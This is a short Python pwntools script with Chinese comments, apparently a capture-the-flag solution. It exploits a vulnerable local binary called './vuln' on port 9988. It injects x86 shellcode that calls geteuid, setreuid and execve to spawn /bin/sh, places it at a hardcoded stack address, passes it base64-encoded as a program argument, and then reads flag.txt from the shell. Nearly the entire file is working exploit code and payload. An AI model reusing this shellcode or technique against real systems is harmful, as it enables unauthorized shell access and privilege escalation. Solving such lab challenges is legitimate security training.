from pwn import *
import time

# 远程连接配置
ip = '127.0.0.1'
port = 9988

# ELF文件和目标缓冲区地址
#buf根据程序输出得到
buf = 0xff8f9d75

# shellcode
shellcode = (
    b'\x6a\x31\x58\x99\xcd\x80'                        # geteuid
    b'\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80'            # setreuid
    b'\xb0\x0b\x52\x68n/sh\x68//bi\x89\xe3\x89\xd1\xcd\x80'  # execve
)
# 构造参数 name 和 index
index = str(0x457)
# index=str(0)
name = p32(buf+4) + shellcode + b'a'*0x10
# 启动远程连接
p = remote(ip, port)
# 注意要进行 base64 编码或转义，因为 shellcode 中有不可见字符
import base64
name_encoded = base64.b64encode(name).decode()
payload = f'./vuln "$(echo {name_encoded} | base64 -d)" {index}'

# 发送payload
p.sendline(payload.encode())
p.sendline(b'cat flag.txt')  # 如果程序成功进入shell，执行cat命令
p.interactive()